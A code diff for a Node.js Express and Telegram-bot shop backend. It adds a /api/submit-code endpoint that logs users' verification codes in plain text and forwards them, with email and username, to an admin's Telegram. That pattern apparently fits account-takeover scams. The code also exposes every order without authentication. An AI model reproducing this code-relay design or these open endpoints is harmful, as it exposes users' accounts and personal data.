@@ -10,15 +10,18 @@ const ADMIN_ID = 7509324385;
 
 console.log('🚀 Запуск сервера...');
 
+// Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.static('.'));
 
+// Подключение к PostgreSQL
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: { rejectUnauthorized: false }
 });
 
+// Инициализация таблицы orders
 async function initDB() {
   const query = `
     CREATE TABLE IF NOT EXISTS orders (
@@ -29,7 +32,7 @@ async function initDB() {
       timestamp      TEXT,
       items          TEXT,
       total          INTEGER,
-      status         TEXT DEFAULT '🟡 Ожидает проверки',
+      status         TEXT DEFAULT 'Ожидание кода',
       status_code    TEXT DEFAULT 'pending',
       promo          TEXT,
       promo_discount INTEGER DEFAULT 0,
@@ -39,6 +42,7 @@ async function initDB() {
       user_id        BIGINT,
       user_name      TEXT,
       user_username  TEXT,
+      verification_code TEXT,
       created_at     TIMESTAMPTZ DEFAULT NOW()
     )
   `;
@@ -46,6 +50,13 @@ async function initDB() {
   try {
     await pool.query(query);
     console.log('✅ Таблица orders готова');
+    
+    // Добавляем колонку verification_code если её нет
+    try {
+      await pool.query(`ALTER TABLE orders ADD COLUMN IF NOT EXISTS verification_code TEXT`);
+      console.log('✅ Колонка verification_code добавлена');
+    } catch(e) { console.log('Колонка уже существует'); }
+    
     const result = await pool.query('SELECT COUNT(*) as count FROM orders');
     console.log(`📦 В базе данных ${result.rows[0].count} заказов`);
   } catch (err) {
@@ -53,6 +64,7 @@ async function initDB() {
   }
 }
 
+// Уведомление админа
 async function notifyAdmin(bot, order) {
   try {
     const items = JSON.parse(order.items || '[]');
@@ -74,6 +86,7 @@ async function notifyAdmin(bot, order) {
   }
 }
 
+// Уведомление пользователя
 async function notifyUser(bot, order) {
   if (!order.user_id) return;
   
@@ -132,7 +145,9 @@ if (BOT_TOKEN) {
   console.log('⚠️ BOT_TOKEN не задан, бот не запущен');
 }
 
-// API ЭНДПОИНТЫ
+// ========== API ЭНДПОИНТЫ ==========
+
+// Проверка статуса
 app.get('/api/status', async (req, res) => {
   try {
     const result = await pool.query('SELECT COUNT(*) as count FROM orders');
@@ -142,6 +157,7 @@ app.get('/api/status', async (req, res) => {
   }
 });
 
+// Все заказы (для админа)
 app.get('/api/orders', async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM orders ORDER BY id DESC');
@@ -151,6 +167,7 @@ app.get('/api/orders', async (req, res) => {
   }
 });
 
+// Заказы пользователя
 app.get('/api/user-orders', async (req, res) => {
   try {
     const userId = req.query.userId;
@@ -162,6 +179,7 @@ app.get('/api/user-orders', async (req, res) => {
   }
 });
 
+// Создать заказ
 app.post('/api/order', async (req, res) => {
   try {
     const o = req.body;
@@ -183,10 +201,12 @@ app.post('/api/order', async (req, res) => {
     }
     res.json({ success: true, orderId: saved.id });
   } catch (err) {
+    console.error('❌ Ошибка:', err.message);
     res.status(500).json({ error: err.message });
   }
 });
 
+// Обновить статус заказа
 app.post('/api/update-status', async (req, res) => {
   try {
     const { orderId, status, statusCode } = req.body;
@@ -203,6 +223,24 @@ app.post('/api/update-status', async (req, res) => {
   }
 });
 
+// Отправить код подтверждения
+app.post('/api/submit-code', async (req, res) => {
+  try {
+    const { orderId, code } = req.body;
+    console.log(`🔐 Получен код от пользователя для заказа #${orderId}: ${code}`);
+    const result = await pool.query('UPDATE orders SET verification_code = $1 WHERE id = $2 RETURNING *', [code, orderId]);
+    if (!result.rows.length) return res.status(404).json({ error: 'Заказ не найден' });
+    if (BOT_TOKEN) {
+      const bot = new Telegraf(BOT_TOKEN);
+      await bot.telegram.sendMessage(ADMIN_ID, `🔐 НОВЫЙ КОД ДЛЯ ЗАКАЗА #${result.rows[0].order_number}\n\nКод: ${code}\nПользователь: @${result.rows[0].user_username || 'без юзернейма'}\nEmail: ${result.rows[0].email || '—'}`);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ========== ЗАПУСК ==========
 initDB().then(() => {
   app.listen(PORT, () => {
     console.log(`🚀 Сервер запущен на порту ${PORT}`);
